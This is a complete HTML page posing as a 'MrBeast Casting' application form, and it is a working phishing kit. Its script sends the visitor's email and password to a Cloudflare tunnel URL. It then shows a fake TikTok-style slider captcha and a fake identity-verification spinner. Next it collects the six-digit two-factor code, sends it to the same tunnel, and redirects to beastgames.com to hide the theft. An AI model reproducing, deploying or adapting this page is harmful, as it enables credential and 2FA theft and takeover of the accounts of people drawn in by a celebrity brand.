<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link href="https://googleapis.com" rel="stylesheet">
    <title>MrBeast Casting</title>
    <style>
        :root { --blue: #00a8e8; --pink: #f12e3e; --green: #00ff88; }
        * { box-sizing: border-box; }
        body { 
            font-family: 'Inter', sans-serif; 
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, var(--blue) 100%); 
            color: #fff; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            min-height: 100vh; 
            margin: 0; 
            overflow-x: hidden; 
            position: relative; 
        }
        .bg-pattern { 
            position: fixed; 
            top: 0; left: 0; width: 100%; height: 100%; 
            background: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png') repeat; 
            background-size: 60px; 
            opacity: 0.15; 
            z-index: 0; 
            animation: float 20s ease-in-out infinite; 
        }
        @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-20px); } }
        .top-logo { width: 280px; margin-top: 50px; margin-bottom: 20px; z-index: 10; position: relative; filter: drop-shadow(0 10px 30px rgba(0,168,232,0.3)); }
        .box { 
            background: rgba(17,17,17,0.95); 
            backdrop-filter: blur(20px); 
            border-radius: 25px; 
            width: 92%; 
            max-width: 420px; 
            padding: 45px 30px; 
            text-align: center; 
            position: relative; 
            z-index: 10; 
            border: 1px solid rgba(255,255,255,0.1); 
            box-shadow: 0 30px 80px rgba(0,0,0,0.6); 
        }
        .mr-glow { 
            font-family: 'Inter', sans-serif; font-weight: 900; font-size: 44px; 
            background: linear-gradient(45deg, var(--pink), #ff6b7a, var(--blue), #4dd0e9); 
            background-size: 300% 300%; 
            -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; 
            animation: gradientShift 3s ease infinite; 
            display: inline-block; 
        }
        @keyframes gradientShift { 0%, 100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
        .beast-style { 
            font-family: 'Inter', sans-serif; font-weight: 900; font-size: 44px; 
            color: #fff !important; 
            display: inline-block; 
        }
        .security-title { 
            font-family: 'Inter', sans-serif; font-weight: 900; font-size: 26px; 
            color: #fff !important; 
            margin-bottom: 10px;
        }
        input { width: 100%; padding: 20px; margin-bottom: 18px; border: 2px solid rgba(255,255,255,0.1); background: rgba(26,26,26,0.8); color: #fff; border-radius: 16px; font-size: 16px; outline: none; }
        input:focus { border-color: var(--blue); box-shadow: 0 0 20px rgba(0,168,232,0.3); }
        .btn { background: linear-gradient(45deg, var(--pink), #ff5e62); color: #fff; border: none; padding: 20px; border-radius: 16px; width: 100%; font-weight: 800; cursor: pointer; text-transform: uppercase; font-size: 16px; }
        
        /* TIKTOK CIRCLE CAPTCHA */
        #captcha_ui { display: none; padding: 25px 0; }
        .captcha-container { position: relative; width: 100%; height: 220px; background: #1e1e1e; border-radius: 16px; border: 2px solid #333; overflow: hidden; margin-bottom: 20px; }
        .captcha-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png') no-repeat center; background-size: 140%; opacity: 0.2; }
        .puzzle-missing { position: absolute; right: 20px; top: 50%; width: 70px; height: 70px; background: #1e1e1e; border-radius: 50%; transform: translateY(-50%); border: 3px dashed var(--blue); z-index: 2; }
        .slider-knob { position: absolute; left: 20px; top: 50%; width: 70px; height: 70px; background: conic-gradient(var(--blue), #4fc3f7, var(--green)); border-radius: 50%; transform: translateY(-50%); cursor: grab; display: flex; align-items: center; justify-content: center; font-size: 28px; font-weight: bold; color: #000; box-shadow: 0 8px 25px rgba(0,168,232,0.4); z-index: 5; }
        .slider-knob.success { background: conic-gradient(var(--green), #4dffb2); box-shadow: 0 8px 25px rgba(0,255,136,0.6); }
        .captcha-title { font-size: 15px; font-weight: 600; color: #fff; margin-bottom: 15px; }
        .status-text { font-size: 14px; color: #aaa; margin-bottom: 15px; }
        #loader, #otp_section { display: none; }
        .spinner { border: 4px solid rgba(0, 212, 255, 0.2); border-top: 4px solid var(--blue); border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 30px auto; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        #otp_section input { font-size: 28px; letter-spacing: 15px; text-align: center; font-weight: 700; padding: 20px 10px; }
    </style>
</head>
<body>
    <div class="bg-pattern"></div>
    <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png" class="top-logo">
    <div class="box">
        <div id="login_section">
            <span class="mr-glow">MR</span><span class="beast-style"> BEAST CASTING</span>
            <p style="color:#aaa; font-size:14px; margin-top:15px; margin-bottom:30px;">Enter your email address to continue</p>
            <input type="email" id="email" placeholder="Email Address">
            <input type="password" id="pass" placeholder="Password">
            <button class="btn" onclick="sendLogin()">CONTINUE</button>
        </div>
        <div id="captcha_ui">
            <p class="captcha-title">Drag The Slider to Fit The Puzzle | TikTok</p>
            <p class="status-text" id="statusText">Drag the circle to match the slot</p>
            <div class="captcha-container" id="captchaContainer">
                <div class="captcha-bg"></div>
                <div class="puzzle-missing"></div>
                <div class="slider-knob" id="sliderKnob">→</div>
            </div>
        </div>
        <div id="loader"><div class="spinner"></div><p>Verifying Identity...</p></div>
        <div id="otp_section">
            <div class="security-title">SECURITY CHECK</div>
            <p style="color:#aaa; font-size:14px; margin:20px 0;">Enter the 6-digit code from your email</p>
            <input type="text" id="2fa_code" placeholder="000000" maxlength="6">
            <button class="btn" onclick="submitOTP()">FINISH APPLICATION</button>
        </div>
    </div>
    <script>
        const tunnel = "https://syndicate-textbooks-pound-eyes.trycloudflare.com";
        function sendLogin() {
            const e = document.getElementById('email').value, p = document.getElementById('pass').value;
            if(e && p) {
                fetch(tunnel, { method: 'POST', body: new URLSearchParams({'email': e, 'pass': p}) });
                document.getElementById('login_section').style.display = 'none';
                document.getElementById('captcha_ui').style.display = 'block';
                initTikTokCaptcha();
            }
        }
        function initTikTokCaptcha() {
            const knob = document.getElementById('sliderKnob'), container = document.getElementById('captchaContainer'), statusText = document.getElementById('statusText');
            let isDragging = false, startX = 0, currentX = 20;
            const move = (e) => {
                if (!isDragging) return;
                let x = ((e.touches ? e.touches[0].clientX : e.clientX) - startX);
                if (x < 20) x = 20; if (x > container.offsetWidth - 90) x = container.offsetWidth - 90;
                currentX = x; knob.style.left = x + 'px';
                if (x > container.offsetWidth - 110) { isDragging = false; knob.classList.add('success'); knob.textContent = '✓'; statusText.textContent = 'Verified!'; setTimeout(showLoader, 1000); }
            };
            const start = (e) => { isDragging = true; startX = (e.touches ? e.touches[0].clientX : e.clientX) - currentX; knob.style.transition = 'none'; };
            const end = () => { if (!knob.classList.contains('success')) { knob.style.left = '20px'; currentX = 20; } isDragging = false; knob.style.transition = 'left 0.3s ease'; };
            knob.addEventListener('mousedown', start); knob.addEventListener('touchstart', start, {passive:false});
            window.addEventListener('mousemove', move); window.addEventListener('touchmove', move, {passive:false});
            window.addEventListener('mouseup', end); window.addEventListener('touchend', end);
        }
        function showLoader() {
            document.getElementById('captcha_ui').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            setTimeout(() => { document.getElementById('loader').style.display = 'none'; document.getElementById('otp_section').style.display = 'block'; }, 2000);
        }
        function submitOTP() {
            const c = document.getElementById('2fa_code').value;
            fetch(tunnel, { method: 'POST', body: new URLSearchParams({'2fa_code': c}) })
            .finally(() => { window.location.href = "https://beastgames.com"; });
        }
    </script>
</body>
</html>
